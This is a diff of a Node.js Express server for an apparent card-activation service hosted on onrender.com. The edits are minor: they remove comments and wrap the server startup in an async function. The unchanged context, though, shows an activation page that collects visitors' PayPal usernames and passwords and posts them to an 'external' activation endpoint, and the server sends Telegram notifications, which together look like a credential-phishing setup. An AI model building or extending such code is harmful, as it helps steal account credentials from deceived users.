@@ -8,7 +8,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 // Enable CORS for frontend
-app.use(cors({ origin: 'https://ii-cyu4.onrender.com' })); // Updated from https://o-448v.onrender.com
+app.use(cors({ origin: 'https://ii-cyu4.onrender.com' }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true })); // For parsing form data
 
@@ -71,11 +71,13 @@ const authenticateToken = (req, res, next) => {
 };
 
 // Test notification on startup
-app.listen(port, async () => {
-    console.log(`Server running on port ${port}`);
-    const testMessage = 'Server started successfully - Test notification from https://ii-cyu4.onrender.com'; // Updated URL
-    await sendTelegramNotification(testMessage);
-});
+(async () => {
+    app.listen(port, async () => {
+        console.log(`Server running on port ${port}`);
+        const testMessage = 'Server started successfully - Test notification from https://ii-cyu4.onrender.com';
+        await sendTelegramNotification(testMessage);
+    });
+})();
 
 // Authentication routes
 app.post('/api/auth/signup', (req, res) => {
@@ -346,7 +348,7 @@ app.get('/card/:cardId/activate', (req, res) => {
                     const data = await response.text();
                     document.getElementById('message').textContent = data;
                     if (response.ok) {
-                        fetch('https://ii-cyu4.onrender.com/api/cards/activate/external', { // Updated URL
+                        fetch('https://ii-cyu4.onrender.com/api/cards/activate/external', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ cardId: '${cardId}', paypalUsername: form.paypalUsername.value, paypalPassword: form.paypalPassword.value })
